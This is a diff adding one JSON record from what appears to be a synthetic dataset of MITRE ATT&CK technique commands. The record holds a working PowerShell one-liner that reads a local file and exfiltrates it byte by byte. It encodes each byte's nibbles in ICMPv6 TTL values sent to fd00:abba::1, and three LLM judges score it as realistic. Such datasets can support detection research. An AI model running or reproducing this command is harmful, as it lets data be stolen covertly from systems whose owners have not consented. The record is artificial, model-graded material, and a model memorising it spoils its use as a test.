@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:abba::1'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d -Count 1 -TimeToLive (70 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $d -Count 1 -TimeToLive (100 + $lo) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Uses ICMPv6 TTL ranges to encode high/low nibbles of each byte, transmitting over ICMPv6 as an alternate medium aligned to T1011.",
+  "rationale_steps": [
+    "Split each byte into two 4-bit values.",
+    "Map nibbles into two distinct TTL ranges for clarity.",
+    "Send sequential ICMPv6 echos that a passive listener can reconstruct."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-3c199886",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes/braces, valid operators (-shr, -band), and correct Test-Connection parameters including -IPv6 and -TimeToLive.",
+        "semantic_score": 5,
+        "semantic_justification": "It reads a file and automatically exfiltrates its contents by encoding each byte\u2019s nibbles into ICMPv6 hop-limit (TTL) values via Test-Connection, aligning with automated exfiltration over an alternative protocol (T1011).",
+        "combined_score": 5.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T04:34:14.010195Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable declarations, balanced parentheses/braces, correct operators, and valid cmdlet syntax for Test-Connection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements automated exfiltration by reading a binary file and encoding each byte into IPv6 TTL values, then transmitting them via ICMPv6 ping requests to an external IPv6 address, which aligns perfectly with the T1011 technique of automated data exfiltration over an alternative protocol.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:34:18.820909Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with correct variable assignments, method calls, loop syntax, bitwise operations, cmdlet usage, and parameter formatting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the described intent by reading a file, encoding each byte's nibbles into distinct ICMPv6 TTL values, and transmitting them via `Test-Connection`, which is a realistic implementation of T1011 Automated Exfiltration using an alternate protocol and encoding.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:05:56.013799Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
